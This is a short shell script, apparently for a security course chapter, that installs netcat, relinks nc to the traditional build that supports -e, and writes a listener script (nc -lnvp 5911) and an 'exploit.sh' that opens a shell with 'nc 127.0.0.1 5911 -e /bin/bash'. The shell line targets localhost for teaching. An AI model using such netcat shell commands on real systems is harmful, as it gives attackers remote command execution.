#!/bin/sh
echo "开始部署本章实验环境...";sleep 1
sudo apt install netcat -y
sudo rm /etc/alternatives/nc && sudo ln -s /bin/nc.traditional /etc/alternatives/nc
echo "createing listen.sh...finish"
echo "start listen 5911 port..." > listen.sh
echo "nc -lnvp 5911" >> listen.sh
chmod +x listen.sh
echo "createing exploit.sh...finish"
echo "nc 127.0.0.1 5911 -e /bin/bash" > exploit.sh
chmod +x exploit.sh
echo "--------------------"
echo "初始化完成,祝实验愉快~"
